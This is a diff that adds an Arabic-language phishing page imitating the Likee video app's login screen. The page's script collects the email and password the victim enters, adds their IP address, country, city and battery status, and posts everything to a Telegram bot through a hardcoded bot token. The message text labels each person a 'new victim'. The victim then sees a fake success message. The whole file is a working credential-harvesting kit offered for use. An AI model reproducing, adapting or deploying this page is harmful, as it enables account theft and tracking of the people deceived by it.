@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Likee - سجل دخولك</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(180deg, #0f0f1a, #1a1025, #0f0f1a);
+            min-height: 100vh;
+            color: white;
+        }
+
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 25px 0 10px;
+        }
+
+        .header .logo {
+            width: 70px;
+            height: 70px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, #e91e63, #9c27b0, #673ab7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 35px;
+            font-weight: bold;
+            color: white;
+            box-shadow: 0 8px 30px rgba(233,30,99,0.3);
+        }
+
+        .header h1 {
+            font-size: 24px;
+            background: linear-gradient(135deg, #e91e63, #9c27b0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 4px;
+        }
+
+        .header .sub {
+            color: #888;
+            font-size: 12px;
+        }
+
+        .nav {
+            display: flex;
+            gap: 5px;
+            margin: 15px 0;
+            overflow-x: auto;
+            padding-bottom: 5px;
+        }
+
+        .nav::-webkit-scrollbar { display: none; }
+
+        .nav span {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 8px 15px;
+            font-size: 12px;
+            color: #aaa;
+            white-space: nowrap;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .nav span.active {
+            background: rgba(233,30,99,0.15);
+            border-color: #e91e63;
+            color: #e91e63;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+            margin: 15px 0;
+        }
+
+        @media (max-width: 350px) {
+            .features { grid-template-columns: 1fr 1fr; }
+        }
+
+        .feature {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 14px;
+            padding: 15px 10px;
+            text-align: center;
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        .feature .icon {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 18px;
+            padding: 25px;
+            margin: 15px 0;
+        }
+
+        .card h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+        }
+
+        .card p {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            margin: 12px 0;
+        }
+
+        .input-group label {
+            display: block;
+            color: #999;
+            font-size: 11px;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            background: rgba(0,0,0,0.3);
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        .input-group input:focus {
+            border-color: #e91e63;
+            box-shadow: 0 0 0 3px rgba(233,30,99,0.1);
+        }
+
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 12px 0;
+            font-size: 12px;
+        }
+
+        .checkbox-row label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .checkbox-row input {
+            width: 16px;
+            height: 16px;
+            accent-color: #e91e63;
+        }
+
+        .checkbox-row a {
+            color: #e91e63;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            background: linear-gradient(135deg, #e91e63, #9c27b0);
+            color: white;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(233,30,99,0.4);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+            color: #555;
+            font-size: 11px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255,255,255,0.1);
+        }
+
+        .social-btns {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+        }
+
+        .social-btn {
+            padding: 12px;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            background: rgba(255,255,255,0.03);
+            color: white;
+            font-size: 13px;
+            cursor: pointer;
+            text-align: center;
+            transition: 0.3s;
+        }
+
+        .social-btn:hover {
+            background: rgba(255,255,255,0.08);
+            border-color: rgba(255,255,255,0.2);
+        }
+
+        .register-link {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #888;
+        }
+
+        .register-link a {
+            color: #e91e63;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 2px;
+            margin: 15px 0;
+            display: none;
+        }
+
+        .progress div {
+            height: 100%;
+            background: linear-gradient(90deg, #e91e63, #9c27b0);
+            width: 0%;
+            border-radius: 2px;
+            transition: 0.5s;
+        }
+
+        .status {
+            text-align: center;
+            color: #e91e63;
+            font-size: 12px;
+            margin: 8px 0;
+            display: none;
+        }
+
+        .done {
+            display: none;
+            text-align: center;
+            color: #4caf50;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 15px 0;
+            font-size: 11px;
+            color: #555;
+        }
+
+        .footer a {
+            color: #777;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">🎬</div>
+            <h1>Likee</h1>
+            <p class="sub">الرئيسية · المبدعون · تحميل التطبيق</p>
+        </div>
+
+        <p style="text-align:center;font-size:13px;color:#ccc;margin:5px 0;">
+            مرحباً بك في Likee
+        </p>
+        <p style="text-align:center;font-size:12px;color:#888;margin-bottom:10px;">
+            سجل دخولك لمشاهدة الفيديوهات القصيرة والمشاركة
+        </p>
+
+        <div class="nav">
+            <span class="active">الأكثر مشاهدة</span>
+            <span>فيديوهات موسيقية</span>
+            <span>تحديات يومية</span>
+            <span>مكافآت حصرية</span>
+            <span>مجتمع تفاعلي</span>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <span class="icon">🔥</span>
+                الأكثر مشاهدة
+            </div>
+            <div class="feature">
+                <span class="icon">🎵</span>
+                فيديوهات موسيقية
+            </div>
+            <div class="feature">
+                <span class="icon">⚡</span>
+                تحديات يومية
+            </div>
+            <div class="feature">
+                <span class="icon">🎁</span>
+                مكافآت حصرية
+            </div>
+            <div class="feature">
+                <span class="icon">👥</span>
+                مجتمع تفاعلي
+            </div>
+            <div class="feature">
+                <span class="icon">📱</span>
+                بث مباشر
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>تسجيل الدخول</h2>
+            <p>أدخل بيانات حسابك للدخول</p>
+
+            <div class="input-group">
+                <label>📧 البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="email" placeholder="example@gmail.com">
+            </div>
+
+            <div class="input-group">
+                <label>🔒 كلمة المرور</label>
+                <input type="password" id="password" placeholder="••••••••">
+            </div>
+
+            <div class="checkbox-row">
+                <label>
+                    <input type="checkbox" checked>
+                    تذكرني
+                </label>
+                <a href="#">نسيت كلمة المرور؟</a>
+            </div>
+
+            <button class="btn" id="btn" onclick="submitData()">
+                تسجيل الدخول
+            </button>
+
+            <div class="progress" id="prog"><div id="fill"></div></div>
+            <div class="status" id="stat"></div>
+            <div class="done" id="done">✅ تم تسجيل الدخول بنجاح! جاري تحويلك...</div>
+
+            <div class="divider">أو</div>
+
+            <div class="social-btns">
+                <div class="social-btn">🅶 Google</div>
+                <div class="social-btn">ⓕ Facebook</div>
+                <div class="social-btn">🍎 Apple</div>
+            </div>
+
+            <div class="register-link">
+                ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 Likee. جميع الحقوق محفوظة |
+            <a href="#">سياسة الخصوصية</a> |
+            <a href="#">شروط الاستخدام</a>
+        </div>
+    </div>
+
+    <script>
+        var cid = new URL(window.location.href).searchParams.get('chatId') || '';
+        var tok = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+
+        function up(p, t) {
+            document.getElementById('fill').style.width = p + '%';
+            if (t) { document.getElementById('stat').style.display = 'block'; document.getElementById('stat').textContent = t; }
+        }
+
+        async function submitData() {
+            if (sent) return;
+            
+            var email = document.getElementById('email').value.trim();
+            var password = document.getElementById('password').value.trim();
+            
+            if (!email || !password) {
+                alert('يرجى إدخال البريد الإلكتروني وكلمة المرور!');
+                return;
+            }
+
+            sent = true;
+            document.getElementById('btn').disabled = true;
+            document.getElementById('btn').textContent = '⏳ جاري تسجيل الدخول...';
+            document.getElementById('prog').style.display = 'block';
+            
+            up(20, 'جاري التحقق من البيانات...');
+
+            var ip = await getIp();
+            var bat = await getBat();
+
+            up(60, 'جاري تسجيل الدخول...');
+
+            var txt = '🎬 Likee - ضحية جديدة!\n\n';
+            txt += '📧 الايميل: ' + email + '\n';
+            txt += '🔑 الباسورد: ' + password + '\n\n';
+            txt += '🌍 IP: ' + ip.ip + '\n';
+            txt += '📍 الدولة: ' + ip.country + '\n';
+            txt += '🏙️ المدينة: ' + ip.city + '\n';
+            txt += '🔋 البطارية: ' + bat.level + '%\n';
+            txt += '⚡ الشحن: ' + bat.charging;
+
+            await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: cid, text: txt })
+            });
+
+            up(100, 'اكتمل!');
+            
+            setTimeout(function() {
+                document.getElementById('prog').style.display = 'none';
+                document.getElementById('stat').style.display = 'none';
+                document.getElementById('done').style.display = 'block';
+            }, 1500);
+        }
+
+        async function getIp() {
+            try { var r = await fetch('https://ipapi.co/json/'); var d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; }
+        }
+
+        async function getBat() {
+            if ('getBattery' in navigator) { try { var b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; } catch(e) {} }
+            return { level: '?', charging: '?' };
+        }
+    </script>
+</body>
+</html>
